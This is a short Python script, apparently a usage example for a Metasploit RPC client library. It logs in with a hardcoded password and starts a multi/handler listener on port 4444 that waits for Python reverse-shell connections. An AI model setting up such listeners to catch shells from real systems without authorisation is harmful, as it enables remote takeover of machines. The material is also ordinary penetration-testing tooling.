import time

from snek_sploit import MetasploitClient, ModuleType, SessionInformation


def main():
    # Initialize client
    client = MetasploitClient("msf", "root", disable_https_warnings=True)
    console = client.consoles.create()

    commands = [
        "use multi/handler",
        "set PAYLOAD python/shell_reverse_tcp",
        "set LHOST 0.0.0.0",
        "set LPORT 4444",
        "run -z",
    ]
    result = console.execute("\n".join(commands))
    print(result)


if __name__ == "__main__":
    main()
